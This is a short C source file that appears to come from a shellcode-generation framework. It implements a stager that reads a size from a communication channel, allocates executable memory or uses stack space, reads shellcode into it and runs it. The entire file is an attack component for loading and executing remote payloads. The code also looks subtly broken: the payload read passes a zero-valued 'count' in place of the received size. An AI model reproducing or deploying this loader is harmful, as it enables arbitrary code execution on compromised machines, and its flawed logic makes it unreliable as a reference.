#include <factory.h>

#include "helpers/channel.c"
#include "helpers/memory.c"
#include "helpers/cpu.c"

typedef __attribute__((noreturn)) void (* shellcode)(void);

enum memory {
    STACK,
    MMAP
};

#ifndef MEMORY
#define MEMORY MMAP
#endif

SHELLCODE_ENTRY {

    struct channel chan = get_communication_channel();
    unsigned short buffer_size = 0, count = 0;
    unsigned char *memory;

    static_assert(MEMORY == MMAP || MEMORY == STACK, "Must set MEMORY parameter to STACK or MMAP.");

    /* Read the size of the input buffer (2 bytes). */
    channel_recv(chan, &buffer_size, sizeof(buffer_size));
    if ( MEMORY == MMAP )
        memory = (unsigned char *) allocate_memory(buffer_size, PROT_READ|PROT_WRITE|PROT_EXEC);
    else
        memory = (unsigned char *) get_sp() + 0x100;

    /* Read shellcode in memory. */
    channel_recv(chan, memory, count);

    /* Execute shellcode. */
    ((shellcode) memory)();

} SHELLCODE_END
